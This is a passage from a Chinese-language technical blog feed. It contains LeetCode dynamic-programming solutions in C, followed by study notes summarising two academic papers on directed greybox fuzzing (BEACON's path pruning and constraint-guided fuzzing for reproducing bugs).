class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="built_in">max</span>(<span class="built_in">int</span> a,<span class="built_in">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> maxSubArray(<span class="built_in">int</span>* nums, <span class="built_in">int</span> numsSize)&#123;</span><br><span class="line">    <span class="built_in">int</span> this_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> max_sum = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        this_sum += nums[i];</span><br><span class="line">        <span class="keyword">if</span>(this_sum&gt;max_sum)</span><br><span class="line">        &#123;</span><br><span class="line">            max_sum = this_sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(this_sum&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this_sum = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> max_sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sol2-动态规划法"><a href="#sol2-动态规划法" class="headerlink" title="sol2: 动态规划法"></a>sol2: 动态规划法</h3><p>这种方法需要的内存比上面一种多很多。具体思想是，用dp[i]来表示计算到第i位时的最大子列和。注意这个子列并不一定是原先数列开头开始的，而是每一步都计算的是当前位置作为结束点时的最大和。</p><p>$dp[i] = max(dp[i-1]+nums[i], nums[i])$</p><p>也就是说，如果上面式子选择了nums[i]更大，那么就应当从nums[i]开始后面的子列。用一个示例模拟计算一下。</p><blockquote><p>[-2,1,-3,4,-1,2,1,-5,4]</p><p>dp[0] = nums[0] = -2</p><p>dp[1] = max(dp[0]+nums[1],nums[1]) = max(-1,1) = 1表示如果完整的数列是[-2,1]，那么最大子列和是1</p><p>dp[2] = max(-2,-3) = -2，表示[-2,1,-3]最大子列和是-2</p><p>dp[3] = max(-2+4,4)=4，表示[-2,1,-3,4]的最大子列和是4</p><p>dp[4] = max(4-1,4) = 3,表示[-2,1,-3,4,-1]的最大子列和是3</p><p>dp[5] = max(3+2,2) = 5, 表示[-2,1,-3,4,-1,2]的最大子列和是5</p><p>dp[6] = max(5+1,1) = 6，表示[-2,1,-3,4,-1,2]的最大子列和是6</p><p>…..</p></blockquote><p>代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> dp[<span class="number">100010</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> MAX = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i] = max(dp[i<span class="number">-1</span>]+nums[i],nums[i]);</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;MAX)</span><br><span class="line">        &#123;</span><br><span class="line">            MAX = dp[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MAX;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="入门题"><a href="#入门题" class="headerlink" title="入门题"></a>入门题</h1><h2 id="解码方法-leetcode第91题"><a href="#解码方法-leetcode第91题" class="headerlink" title="解码方法(leetcode第91题)"></a>解码方法(leetcode第91题)</h2><blockquote><p>一条包含字母 A-Z 的消息通过以下映射进行了 编码 ：</p><p>‘A’ -&gt; “1”<br>‘B’ -&gt; “2”<br>…<br>‘Z’ -&gt; “26”</p><p>要 解码 已编码的消息，所有数字必须基于上述映射的方法，反向映射回字母（可能有多种方法）。例如，”11106” 可以映射为：</p><pre><code>&quot;AAJF&quot; ，将消息分组为 (1 1 10 6)&quot;KJF&quot; ，将消息分组为 (11 10 6)</code></pre><p>注意，消息不能分组为  (1 11 06) ，因为 “06” 不能映射为 “F” ，这是由于 “6” 和 “06” 在映射中并不等价。</p><p>给你一个只含数字的 非空 字符串 s ，请计算并返回解码方法的总数 。</p><p>题目数据保证答案肯定是一个 32位的整数。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/decode-ways">https://leetcode.cn/problems/decode-ways</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><del>这道题很奇怪，在远程泡会显示堆溢出，但是本地跑就没有问题。这题不能确定自己做的对不对。我的思路是用以下的状态变化。</del></p><p><del>$dp[cnt] = (dp[cnt - 1] + valid_one(s[i])) + (dp[cnt - 2] + valid_two(s[i - 1], s[i]))-dp[cnt-1];$</del></p><p><del>可能的编码总数。计算方法看dp[i-1]加上nums[i]，这是一种，也就是一个新的数字。第二种是考虑dp[i-2]+valid_two(s[i - 1], s[i]),也就是把最后两个数字作为一个整体。但是注意要两个结合起来会出现重复，重复的内容。</del></p><p>记录一下自己没认真审题造成的错误..。上面的算法是错的，因为我们不是计算解码的字符数量，而是计算能够成功解码的种类。这样的话假如下一个数字是’2’，并没有增加解码的种类数，结果将保持不变。</p><p>那么本题的状态转移可以写为</p><ol><li>如果s[0] == ‘0’，无法解码</li><li>如果s[i] == ‘0’，并且s[i-1]=’1’或者s[i-1]=’2’，那么方案数量不变，dp[i] = dp[i-2]，否则方案数为0.</li><li>如果s[i] ！= ‘0’，如果s[i-1] == ‘1’，那么方案数为dp[i-1]+dp[i-2]</li><li>如果s[i] ！= ‘0’，如果s[i-1] == ‘2’，那么在s[i]&lt;’6’的情况下，方案数为dp[i-1]+dp[i-2]</li><li>其余情况下均为s[i] = s[i-1]，即不变。</li></ol><p>事实上，还有一些很刁钻的边界条件..导致我的代码对于数字特别小的时候特别简陋。一些刁钻的数字比如说”301”,”10”这种。唉不过不得不说，如果没有leetcode提示我哪些数据没通过，自己找实在是找不到啊..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">numDecodings</span><span class="params">(<span class="type">char</span>* s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> dp[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>((((s[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span>+s[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>)&lt;=<span class="number">26</span>) &amp;&amp; len &gt; <span class="number">1</span> &amp;&amp; s[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">2</span>; <span class="comment">// 可以组成两位数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]&gt;<span class="string">&#x27;2&#x27;</span> &amp;&amp; s[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i<span class="number">-1</span>] == <span class="string">&#x27;1&#x27;</span> || s[i<span class="number">-1</span>] == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i<span class="number">-1</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-1</span>] + dp[i<span class="number">-2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (s[i<span class="number">-1</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s[i]&lt;=<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-1</span>] + dp[i<span class="number">-2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="built_in">strlen</span>(s)<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打家劫舍-leetcode第198题"><a href="#打家劫舍-leetcode第198题" class="headerlink" title="打家劫舍(leetcode第198题)"></a>打家劫舍(leetcode第198题)</h2><blockquote><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警.</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/house-robber">https://leetcode.cn/problems/house-robber</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>也算是动态规划的一个经典题目。重要的状态转移方程如下第21行所示。简单解释一下。</p><p>由于当偷到第i个房子的时候，可以选择偷或者不偷(这里假设我们一次性的就求出所有的情况)，如果不偷，情况就和第i-1是一样的。但是如果偷了，就要在第i-2次的基础上相加。注意这里并没有舍弃i-1次的结果，他仍然有可能在下一次计算中被使用。因此可以写出状态转移方程为</p><p>$dp[i] = max(dp[i-1],dp[i-2]+nums[i])$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> dp[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> MAX = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(numsSize == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(numsSize == <span class="number">2</span>) <span class="comment">// 对于数组大小为1和2坐特殊处理</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> max(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">1</span>] = max(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i] = max(dp[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+nums[i]);</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;MAX)</span><br><span class="line">        &#123;</span><br><span class="line">            MAX = dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MAX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除并获得点数-leetcode第740题"><a href="#删除并获得点数-leetcode第740题" class="headerlink" title="删除并获得点数(leetcode第740题)"></a>删除并获得点数(leetcode第740题)</h2><blockquote><p>给你一个整数数组 nums ，你可以对它进行一些操作。</p><p>每次操作中，选择任意一个 nums[i] ，删除它并获得 nums[i] 的点数。之后，你必须删除 所有 等于 nums[i] - 1 和 nums[i] + 1 的元素。</p><p>开始你拥有 0 个点数。返回你能通过这些操作获得的最大点数。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/delete-and-earn">https://leetcode.cn/problems/delete-and-earn</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这道题初次做的时候没有什么思路。一开始想的是从第二个数字开始，找每次的最大值。在想状态转移方程里面转移的时候，该怎么删除之前已经加到sum中的数据，再新增一个计数空间复杂度就要翻倍。</p><p>但是实际上这道题是上面题目的变种。我们只需要一个简单的映射就可以把这道题划归到上面题目中。</p><p>如果我们建立一个由小到大排序的数组，数组下标就是数字，而数组内容就是数字重复的个数，这样就能很容易统计加上了多少数字。再想想，其实这个数组就是“如果取了a，那么a-1和a+1都需要丢弃”，那么也就是上面的打家劫舍题目。只不过现在的状态转移方程如下</p><p>$dp[i] = max(dp[i-1] , dp[i-2]+nums[i]*i)$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a ,<span class="type">int</span> b )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteAndEarn</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="comment">// first get the frequence case</span></span><br><span class="line">    <span class="type">int</span> fre[<span class="number">10010</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> dp[<span class="number">10010</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> MAX = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fre[nums[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// dp</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = fre[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;<span class="number">10010</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i] = max(dp[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+fre[i]*i); <span class="comment">// 使用转换后的fre数组，不再使用Num</span></span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;MAX)</span><br><span class="line">        &#123;</span><br><span class="line">            MAX = dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MAX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</title>
      <link href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/"/>
      <url>/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/</url>
      
        <content type="html"><![CDATA[<p>white box fuzzing一般使用符号执行，天生使用符号执行从根本上限制了他们的扩展能力，并且执行速度一般非常慢(24小时以上)，而grey box fuzzing技术并不是直接抛弃拒绝无法达到的路径，而是根据每个seed的score(能够到达目标地址的可能性，通过判定距离目标位置的远近，或者机器学习的方法)，给出seed优先权。但是由于不对地址做预先筛选，大部分执行路径是无法到达target site的。</p><p>本文给出的Beacon的创新点在于，<strong>通过廉价的静态分析，我们可以计算直接导致目标路径不可行的程序变量值的合理近似值</strong>，从而根据此就可以修剪超过80%的不可行路径(包含无法到达以及到达时数据条件不满足两种情况)。</p><span id="more"></span><h1 id="Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning"><a href="#Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning" class="headerlink" title="Directed Grey-Box Fuzzing with Provable Path Pruning"></a>Directed Grey-Box Fuzzing with Provable Path Pruning</h1><p>文章标题是”具有可证明路径剪枝”的DGF。</p><h2 id="问题和创新点"><a href="#问题和创新点" class="headerlink" title="问题和创新点"></a>问题和创新点</h2><p>white box fuzzing一般使用符号执行，天生使用符号执行从根本上限制了他们的扩展能力，并且执行速度一般非常慢(24小时以上)，而grey box fuzzing技术并不是直接抛弃拒绝无法达到的路径，而是根据每个seed的score(能够到达目标地址的可能性，通过判定距离目标位置的远近，或者机器学习的方法)，给出seed优先权。但是由于不对地址做预先筛选，大部分执行路径是无法到达target site的。</p><p>本文给出的Beacon的创新点在于，<strong>通过廉价的静态分析，我们可以计算直接导致目标路径不可行的程序变量值的合理近似值</strong>，从而根据此就可以修剪超过80%的不可行路径(包含无法到达以及到达时数据条件不满足两种情况)。</p><p>为了确保一个进程状态的有效性，引入一个新的静态分析方式，来达到精确性和有效性</p><ul><li>relationship preservation</li></ul><p>保持变量之间的数据流关系，从而保持精度</p><ul><li>bounded disjunction</li></ul><p>防止析取过多导致推理的浪费</p><p>因此总的来说，这种fuzzer就是通过首先引入一种轻量级静态分析技术判断数据流条件，对所有不可能的路径进行剪枝，从而减少fuzzer的开销</p><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>上述推理器首先把中间程序状态计算为最弱先决条件（也称为必要先决条件）的近似值，这在静态分析中得到了广泛的研究 。举个例子</p><p><img src="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/image-20220813175421660.png" alt="image-20220813175421660"></p><p>对于上图中，我们如果想要计算从13行到18行的最近距离，需要满足从14行到18行的所有条件合取的结果。这个合取结果就称为最弱先决条件。不满足这个条件的输入可以被安全的舍弃。</p><p>然而，此时我们仍需考虑静态处理中的一些问题。静态分析一般是速度和准确性不能共存的，并且对于路径求解，一般的静态分析会直接在CFG汇合处合并条件(会产生问题例如a&lt;10并且a&gt;20被合并为a&lt;10 || a&gt;20的错误)或者直接舍弃必要结果，这些对于fuzz都是不可接受的。</p><h3 id="BEACON"><a href="#BEACON" class="headerlink" title="BEACON"></a>BEACON</h3><p><img src="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/image-20220813180547076.png" alt="image-20220813180547076"></p><p>首先，BEACON对代码做一个可达分析，并且把显然不能到达目标的路径删除。</p><p>其次BEACON如何解决上面两个问题？</p><p>首先，关系保持。在变量之间关系保持能够带来更加准确的前提条件，这样可以减少更多分支。这要求我们记录下买一个变量的位置作为他们的标识。</p><p>其次，有界析取。例如将($-\infty$，5)∪(25, $+\infin$)做一个上下界限制。</p><p>作者采用的instrument的方法是通过添加assert语句的instrument来减少分支执行。</p><h3 id="后向区间分析"><a href="#后向区间分析" class="headerlink" title="后向区间分析"></a>后向区间分析</h3><p>这一部分的目的是确保被剪枝的路径确实不能到达目标block。我们需要接受目标地址块和初始条件作为参数。举个例子</p><p><img src="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/image-20220814110431242.png" alt="image-20220814110431242"></p><p>对于上面这张图，如果设置目标($\phi$)为第18行的w&gt;10，并且假设第18行的条件为正确(可达)我们向前追溯，直到第9行，则有以下两种分支。但是求解以下分支需要的SMT比较复杂。</p><p><img src="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/image-20220814110715662.png" alt="image-20220814110715662"></p><p>作者为了解决这个问题，设计了一个线性域</p><p>例如对于上面的条件，写出如下的线性域。注意两者取交集的表示方式。</p><p><img src="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/image-20220814114019603.png" alt="image-20220814114019603"></p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ol><li><strong>合并分支</strong></li></ol><p>当到达l的路径个数比<em>threshold</em>小的时候，就保持原来的条件不变，否则就要对条件进行合并。合并的原则是对于合并后对精确性影响最小的两个条件。下图是精度丢失的例子。</p><p><img src="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/image-20220818172643856.png" alt="image-20220818172643856"></p><p>其实合并的过程就是取并集，而精度丢失也就是并集中多增加的元素。</p><ol start="2"><li><strong>预条件instrument</strong></li></ol><p>这个优化是为了解决我们关注的变量过多的问题。作者的思想是如果变量B由变量A决定，那么就不关注变量B。具体来说，算法为</p><ol><li>将程序转换为<a href="https://dl.acm.org/doi/10.1145/115372.115320">SSA模式</a>这个后续还要看一下，因为SSA模式确保一个变量在写之前不会被定义。(可能通过这种方法可以确保变量定义位置)</li><li>如果确保变量B由变量A决定，那么就不关注变量B。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下BEACON带来的优化思想，是输入生成(input generation)和种子优化(seed prioritization)。具体来说，包含了<strong>1.去除不必要的分支来减少随机性带来的开销，并验证这种分支优化是合理的</strong>。<strong>2.对输入条件做总结(使用映射到线性域的方式)，优化推理过程</strong></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>这里顺便记录一下从image启动container的方法</p><ol><li>docker run -dit yguoaz/beacon /bin/bash (从image启动docker)</li><li>docker exec -it d0f4b4974782 /bin/bash (这里的数字是containerID)</li></ol><p>好吧，这个工程文件也没有提供源码</p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> directed_fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Constraint-guided_Directed_Greybox_Fuzzing</title>
      <link href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/"/>
      <url>/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/</url>
      
        <content type="html"><![CDATA[<p>关于fuzz领域看的第二篇论文。这篇论文创新性的将数据流差距和控制流顺序也放在seed评估中(而不是传统的代码覆盖率)，并自动化的实现了从core dump和patchlog中提取数据限制的方法。提升了对于direct fuzz效率的提升。</p><span id="more"></span><h1 id="Constraint-guided-Directed-Greybox-Fuzzing"><a href="#Constraint-guided-Directed-Greybox-Fuzzing" class="headerlink" title="Constraint-guided Directed Greybox Fuzzing"></a>Constraint-guided Directed Greybox Fuzzing</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a><strong>一、概述</strong></h2><p>作者在现在有的DGF的前提下，新增了代码流顺序以及数据流作为seed优劣的一个选择标志。对于堆栈溢出以及UAF等对于代码执行顺序有要求以及对数据要求较高的漏洞提供了一个较好的复现基础。</p><p>此外，作者通过自动化分析core dump和patchlog可以直接得到上述的constrains用于fuzz，大大提升了人工分析时间。</p><h2 id="二、论文背景及前提"><a href="#二、论文背景及前提" class="headerlink" title="二、论文背景及前提"></a><strong>二、论文背景及前提</strong></h2><h3 id="所解决的问题"><a href="#所解决的问题" class="headerlink" title="所解决的问题"></a><strong>所解决的问题</strong></h3><p>当前的direct greybox fuzzing在达到目标位置时的速度较慢，因为没有考虑到达到目标位置的控制流顺序和数据要求(data condition)本文通过自动识别并使得fuzz通过一系列的限制(该限制也是自动生成的)到达目标代码区域，用来增大fuzz效率。</p><h3 id="解决问题的前提"><a href="#解决问题的前提" class="headerlink" title="解决问题的前提"></a><strong>解决问题的前提</strong></h3><p>一般来说，grey box fuzzing在给定一些条件，比如开发者们获取了一个第三方用户的crash report之后，复现起来相对于通过代码覆盖率guided的fuzzing方式还是比较容易的。传统的DGF并没有考虑到数据流的依赖(例如栈溢出，POC生成)，也进行了关于目标位置之间相互独立的错误假设(例如UAF)。</p><h2 id="三、技术原理与实现"><a href="#三、技术原理与实现" class="headerlink" title="三、技术原理与实现"></a><strong>三、技术原理与实现</strong></h2><h3 id="CGDF评估方式"><a href="#CGDF评估方式" class="headerlink" title="CGDF评估方式"></a>CGDF评估方式</h3><p>文章开发了一种以限制为导向的grey box fuzzing工具，CGDF。CGDF的目标是通过满足一系列的限制来达到最终target site。其中目标分为数据流和控制流两方面。</p><p>判断某个seed是否足够满足constrains的方法，CGDF设计了一种<code>distance of the constrains</code>。和传统的DGF不同。下图中红色框是free()，蓝色框是UAF的位置。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812102243660.png" alt="image-20220812102243660"></p><p>例如使用seedA，使用DGF计算距离时首先第一个块距离两个块距离都是3，因此使用调和平均，(1/3+1/3)^(-1)得到3/2。而如果两者不同，则选择到达目标块的最近距离，例如计算e块，e到达红色快距离是3，到达蓝色快是1，因此就计算为1，那么在e块的结果就是(1/1)^(-1)=1.以此类推。因此总的来说，使用DGF得到的距离之和是</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812102911913.png" 